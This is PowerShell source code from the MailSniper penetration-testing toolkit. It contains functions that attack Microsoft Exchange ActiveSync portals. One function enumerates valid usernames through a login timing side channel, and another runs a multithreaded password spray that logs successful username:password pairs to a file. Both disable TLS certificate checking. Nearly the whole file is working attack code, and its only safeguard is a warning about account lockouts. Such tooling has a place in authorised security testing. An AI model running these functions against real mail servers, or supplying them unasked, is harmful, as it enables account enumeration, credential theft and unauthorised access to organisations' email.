function Invoke-UsernameHarvestEAS {
<#
  .SYNOPSIS

    This module will attempt to connect to an Exchange Active Sync (EAS) portal and harvest valid usernames. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!

    MailSniper Function: Invoke-UsernameHarvestEAS
    Author: Steve Motts (@fugawi72) and Beau Bullock (@dafthack) **mostly a copy and paste of Fehrman/Bullock's Invoke-UsernameHarvestOWA function**
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

        This module will attempt to harvest useranmes from an EAS portal. The module uses an anomaly where invalid usernames have a much greater response time than valid usernames, even if the password is invalid. The module uses a password that is likely to be invalid for all accounts. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!

    .PARAMETER ExchHostname

        The hostname of the Exchange server to connect to.
 
    .PARAMETER OutFile

        Outputs the results to a text file.

    .PARAMETER UserList

        List of usernames 1 per line to to attempt to check for validity.

    .PARAMETER Password

        A single password to attempt a password spray with.

    .PARAMETER Domain
       
        Domain name to prepend to usernames

    .PARAMETER Threads
       
        Number of password spraying threads to run.

  
  .EXAMPLE

    C:\PS> Invoke-UsernameHarvestEAS -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile eas-valid-users.txt

    Description
    -----------
    This command will connect to the EAS server at https://mail.domain.com/Microsoft-Server-ActiveSync/ and attempt to harvest a list of valid usernames by password spraying the provided list of usernames with a single password over 1 thread and write to a file called eas-valid-users.txt.

#>
  Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [system.URI]
    $ExchHostname = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $OutFile = "",

    [Parameter(Position = 2, Mandatory = $True)]
    [string]
    $UserList = "",

    [Parameter(Position = 3, Mandatory = $True)]
    [string]
    $Domain = "",

	[Parameter(Position = 4, Mandatory = $False)]
    [string]
    $Password = "",
        
    [Parameter(Position = 5, Mandatory = $False)]
    [string]
    $Threads = "1"

  )
    
    Write-Host -ForegroundColor "yellow" "[*] Now spraying EAS portal at https://$ExchHostname/Microsoft-Server-ActiveSync"
    #Setting up URL's for later
    $EASURL = ("https://" + $ExchHostname + "/Microsoft-Server-ActiveSync")
    
    $Usernames = @()
    $Usernames += Get-Content $UserList
    $Users = @()
    $count = $Usernames.count
	
	#Gen a random password if one isnt given
    if ($Password -eq "") {
        $Password = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
    }


    ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
    ## Code From http://poshcode.org/624

    ## Create a compilation environment
    $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
    $Compiler=$Provider.CreateCompiler()
    $Params=New-Object System.CodeDom.Compiler.CompilerParameters
    $Params.GenerateExecutable=$False
    $Params.GenerateInMemory=$True
    $Params.IncludeDebugInformation=$False
    $Params.ReferencedAssemblies.Add("System.DLL") > $null

    $TASource=@'
    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
      public class TrustAll : System.Net.ICertificatePolicy {
        public TrustAll() { 
        }
        public bool CheckValidationResult(System.Net.ServicePoint sp,
          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
          System.Net.WebRequest req, int problem) {
          return true;
        }
      }
    }
'@ 
    $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
    $TAAssembly=$TAResults.CompiledAssembly

    ## We now create an instance of the TrustAll and attach it to the ServicePointManager
    $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
    [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll


    ##This "primes" the username harvesting. First few names in the list can produce weird results, so use throwaways.
    for( $i = 0; $i -lt 5; $i++ ){
        $Users += -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
    }

    $Users += $Usernames

    $AvgTime = Get-BaseLineResponseTimeEAS -EASURL $EASURL -Domain $Domain
    $AvgTime = $AvgTime[-1]
    Write-Host "AvgTime: " $AvgTime
    $Thresh = $AvgTime * 0.6
    Write-Host "Threshold: " $Thresh

    $fullresults = @()
	
    ## end code from http://poshcode.org/624
	Write-Host "Response Time (MS) `t Domain\Username"
    ForEach($Username in $Users)
    {
        $CurrUser = $Domain + "\" + $Username
        #Logging into EAS    
        #Setting parameters for the login to EAS
		#EAS requires user/pass to be submitted as a Base64 encoded string and placed in the authorization header of the web request
        $EncodeUsernamePassword = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($('{0}:{1}' -f $CurrUser, $Password)))
        $Headers = @{'Authorization' = "Basic $($EncodeUsernamePassword)"}
        
        $Timer = [system.diagnostics.stopwatch]::startNew()
		try {
			$easlogin = Invoke-WebRequest -Uri $EASURL -Headers $Headers -Method Get -ErrorAction Stop
        }
        #Catch errors (401 - Unauthorized access) to prevent output to console
		catch {
            $resp = $_.Exception.Response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($resp)
            $reader.BaseStream.Position = 0
            $reader.DiscardBufferedData()
            $res = $reader.ReadToEnd()
        }
        
		$TimeTaken = [double]$Timer.ElapsedMilliseconds
 		Write-Host "$TimeTaken `t`t`t`t $CurrUser"
        
		if ($TimeTaken -le $Thresh)
        {
            Write-Host -ForegroundColor "yellow" "[*] Potentially Valid! User:$CurrUser"
            $fullresults += $CurrUser
        }
    }

    Write-Host -ForegroundColor "yellow" ("[*] A total of " + $fullresults.count + " potentially valid usernames found.")
    if ($OutFile -ne "")
       {
            $fullresults | Out-File -Encoding ascii $OutFile
            Write-Host "Results have been written to $OutFile."
       }
}


function Invoke-PasswordSprayEAS{
<#
  .SYNOPSIS

    This module will first attempt to connect to Exchange Active Sync (EAS) and perform a password spraying attack using a userlist and a single password. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!

    MailSniper Function: Invoke-PasswordSprayEAS
    Author: Steve Motts (@fugawi72) and Beau Bullock (@dafthack) (mostly a copy and paste of Fehrman/Bullock's Invoke-PasswordSpray OWA function)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

        This module will first attempt to connect to EAS and perform a password spraying attack using a userlist and a single password. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!

    .PARAMETER ExchHostname

        The hostname of the Exchange server to connect to.
 
    .PARAMETER OutFile

        Outputs the results to a text file.

    .PARAMETER UserList

        List of usernames 1 per line to to attempt to password spray against.

    .PARAMETER Password

        A single password to attempt a password spray with.

    .PARAMETER Threads
       
        Number of password spraying threads to run.

    .PARAMETER Domain

        Specify a domain to be used with each spray. Alternatively the userlist can have users in the format of DOMAIN\username or username@domain.com

  
  .EXAMPLE

    C:\PS> Invoke-PasswordSprayEAS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile owa-sprayed-creds.txt

    Description
    -----------
    This command will connect to EAS at https://mail.domain.com/owa/ and attempt to password spray a list of usernames with a single password over 15 threads and write to a file called owa-sprayed-creds.txt.

#>
  Param(


    [Parameter(Position = 0, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",

    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $OutFile = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $UserList = "",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $Password = "",

    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $Threads = "5",

    [Parameter(Position = 6, Mandatory = $False)]
    [string]
    $Domain = ""

  )
    
    Write-Host -ForegroundColor "yellow" "[*] Now spraying EAS at https://$ExchHostname/Microsoft-Server-ActiveSync/"
	#Setting up URL for later
    $EASURL = ("https://" + $ExchHostname + "/Microsoft-Server-ActiveSync")
    $Usernames = Get-Content $UserList
    $count = $Usernames.count
    $sprayed = @()
    $userlists = @{}
    $count = 0 
	$Usernames |% {$userlists[$count % $Threads] += @($_);$count++}
	$CurTime = Get-Date -Format g
    Write-Host "Time: " $CurTime
	$StopWatch = [System.Diagnostics.Stopwatch]::StartNew()
   
    0..($Threads-1) |% {
	
    Start-Job -ScriptBlock{
	
    ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
    ## Code From http://poshcode.org/624

    ## Create a compilation environment
    $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
    $Compiler=$Provider.CreateCompiler()
    $Params=New-Object System.CodeDom.Compiler.CompilerParameters
    $Params.GenerateExecutable=$False
    $Params.GenerateInMemory=$True
    $Params.IncludeDebugInformation=$False
    $Params.ReferencedAssemblies.Add("System.DLL") > $null

    $TASource=@'
    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
      public class TrustAll : System.Net.ICertificatePolicy {
        public TrustAll() { 
        }
        public bool CheckValidationResult(System.Net.ServicePoint sp,
          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
          System.Net.WebRequest req, int problem) {
          return true;
        }
      }
    }
'@ 
    $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
    $TAAssembly=$TAResults.CompiledAssembly

    ## We now create an instance of the TrustAll and attach it to the ServicePointManager
    $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
    [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll

    $Password = $args[1]
    $EASURL = $args[2]
    $Domain = $args[3]
	## end code from http://poshcode.org/624
    ForEach($Username in $args[0])
	{
      #Logging into EAS    
      if ($Domain -ne "")
      {
        $Username = ("$Domain" + "\" + "$Username")
      }
	  
	  #store session data (see below)
	  $sess = ""
	  
	  #Logging into EAS    
      #Setting parameters for the login to EAS
	  #EAS requires user/pass to be submitted as a Base64 encoded string and placed in the authorization header of the web request
      $EncodeUsernamePassword = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($('{0}:{1}' -f $Username, $Password)))
      $Headers = @{'Authorization' = "Basic $($EncodeUsernamePassword)"}
        
      try
	  {
        $easlogin = Invoke-WebRequest -Uri $EASURL -Headers $Headers -Method Get -SessionVariable sess -ErrorAction Stop
      }
      catch
	  {
        $resp = $_.Exception.Response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($resp)
        $reader.BaseStream.Position = 0
        $reader.DiscardBufferedData()
        $res = $reader.ReadToEnd()
        $StatusCode = $_.Exception.Response.StatusCode.Value__
		#Enable if you want specific description and cookie info
        #$StatusDesc = $_.Exception.Response.StatusDescription
		#$cookies = $sess.Cookies.GetCookies($EASURL)
      }
	
	  #505 (HTTP version not supported), if this message is received authentication was successful, however browser is not supported
	  if ($StatusCode -eq 505)
	  {
	    Write-Output "[*] SUCCESS! User:$username Password:$password"	
	  } 
	
	$curr_user+=1 
    }	
    }  -ArgumentList $userlists[$_], $Password, $EASURL, $Domain | Out-Null
  	
}
$Complete = Get-Date
$MaxWaitAtEnd = 10000
$SleepTimer = 200
        $fullresults = @()
While ($(Get-Job -State Running).count -gt 0)
{
  $RunningJobs = ""
  ForEach ($Job  in $(Get-Job -state running)){$RunningJobs += ", $($Job.name)"}
  $RunningJobs = $RunningJobs.Substring(2)
  Write-Progress  -Activity "Password Spraying EAS at https://$ExchHostname/Microsoft-Server-ActiveSync/. Sit tight..." -Status "$($(Get-Job -State Running).count) threads remaining" -PercentComplete ($(Get-Job -State Completed).count / $(Get-Job).count * 100)
  If ($(New-TimeSpan $Complete $(Get-Date)).totalseconds -ge $MaxWaitAtEnd){"Killing all jobs still running . . .";Get-Job -State Running | Remove-Job -Force}
    Start-Sleep -Milliseconds $SleepTimer
    ForEach($Job in Get-Job){
      $JobOutput = Receive-Job $Job
      Write-Output $JobOutput
      $fullresults += $JobOutput
    }
}

Write-Output ("[*] A total of " + $fullresults.count + " credentials were obtained.")
if ($OutFile -ne "")
  {
    $fullresults = $fullresults -replace '\[\*\] SUCCESS! User:',''
    $fullresults = $fullresults -replace " Password:", ":"
    $fullresults | Out-File -Encoding ascii $OutFile
    Write-Output "Results have been written to $OutFile."
  }
$ElapsedTime = $StopWatch.Elapsed  
$StopWatch.Stop()
Write-Host "Time Taken: " $ElapsedTime
$CurTime = Get-Date -Format g
Write-Host "Time: " $CurTime
}


function Get-BaseLineResponseTimeEAS {
<#
  .SYNOPSIS

    This module performs a series of invalid login attempts against an OWA portal in order to determine the baseline response time for invalid users or invalid domains

    MailSniper Function: Get-BaseLineResponseTime
    Author: Brian Fehrman (@fullmetalcache)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

       This module is used to help determine the average time taken for an OWA server to respond when it is given either an invalid domain with an invalid username or a valid domain with an invalid username.
       
       Note that there is a better method for obtaining the mail's internal domain name. This will be added in future versions. This and the timing attacks are detailed by Nate Power (http://securitypentest.com/).

    .PARAMETER OWAURL

        OWAURL for the portal (typicallyof the form  https://<mailserverurl>/owa/auth.owa)

    .PARAMETER OWAURL2
        OWAURL2 for the portal (typically of the form https://<mailserverurl>/owa/)

    .PARAMETER Domain
        Correct Domain name for the User/Environment (if previously obtained)

  
  .EXAMPLE

    C:\PS> Get-BaseLineResponseTime -OWAURL https://mail.company.com/owa/auth.owa -OWAURL2 https://mail.company.com/owa/

    Description
    -----------
    This command will get the baseline response time for when an invalid domain name is provided to the owa portal.

  .EXAMPLE

    C:\PS> Get-BaseLineResponseTime -OWAURL https://mail.company.com/owa/auth.owa -OWAURL2 https://mail.company.com/owa/ -Domain ValidInternalDomain

    Description
    -----------
    This command will get the baseline response time for when a valid domain name and an invalid username are provided to the owa portal

#>
    Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $EASURL = "",

    #[Parameter(Position = 1, Mandatory = $True)]
    #[string]
    #$OWAURL2 = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $Domain = ""

    )

    $Users = @()

    for($i = 0; $i -lt 5; $i++) { 
        $UserCurr = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})

        if( $Domain -eq "" ) {
            $DRand = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
            $Users += $Drand + "\" + $UserCurr
        }
        else {
            $Users += $Domain + "\" + $UserCurr
        }
    }

    $Password = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})

    $AvgTime = 0.0
    $NumTries = 0.0

 ## end code from http://poshcode.org/624
    Write-Host ""
    Write-Host "Determining baseline response time..."
	Write-Host "Response Time (MS) `t Domain\Username"
    ForEach($Username in $Users)
    {
        #Logging into EAS    
        #Setting parameters for the login to EAS
        $EncodeUsernamePassword = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($('{0}:{1}' -f $Username, $Password)))
        $Headers = @{'Authorization' = "Basic $($EncodeUsernamePassword)"}
        
        #Primer Call
        try { $easlogin = Invoke-WebRequest -Uri $EASURL -Headers $Headers -Method Get } catch { $_.Exception.Response.GetResponseStream }  
        
        $Timer = [system.diagnostics.stopwatch]::startNew()
        try { $easlogin = Invoke-WebRequest -Uri $EASURL -Headers $Headers -Method Get } catch { $_.Exception.Response.GetResponseStream }
        $TimeTaken = [double]$Timer.ElapsedMilliseconds
        Write-Host "$TimeTaken `t`t`t`t $Username"    
        #Throw away first three values, as they can sometimes be garbage
        $NumTries += 1.0
        $AvgTime += $TimeTaken
    }

    $AvgTime /= $NumTries

    Write-Host ""
    Write-Host "`t Baseline Response: $AvgTime"
    Write-Host ""

    return $AvgTime
}   
